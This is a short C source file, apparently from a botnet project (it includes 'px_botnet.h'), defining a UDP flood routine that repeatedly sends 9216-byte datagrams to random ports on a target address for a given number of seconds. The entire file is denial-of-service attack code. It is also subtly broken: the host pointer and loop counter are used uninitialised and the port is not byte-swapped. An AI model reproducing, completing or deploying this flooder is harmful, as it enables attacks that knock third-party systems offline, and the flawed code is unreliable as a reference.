#include "../../includes/px_botnet.h"

void UNKNOWN(unsigned char *ip, int port, int secs)
{
	int flag = 1, fd, i;

	char *buf = (char *)malloc(9216);

	struct hostent *hp;
	struct sockaddr_in sin;

	time_t start = time(NULL);

	bzero((char *)&sin, sizeof(sin));
	bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = port;

	while (1)
	{

		sin.sin_port = rand();

		if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		{
		}
		else
		{
			flag = 1;
			ioctl(fd, FIONBIO, &flag);
			sendto(fd, buf, 9216, 0, (struct sockaddr *)&sin, sizeof(sin));
			close(fd);
		}

		if (i >= 50)
		{
			if (time(NULL) >= start + secs)
				break;
			i = 0;
		}
		i++;
	}
	close(fd);
	exit(0);
}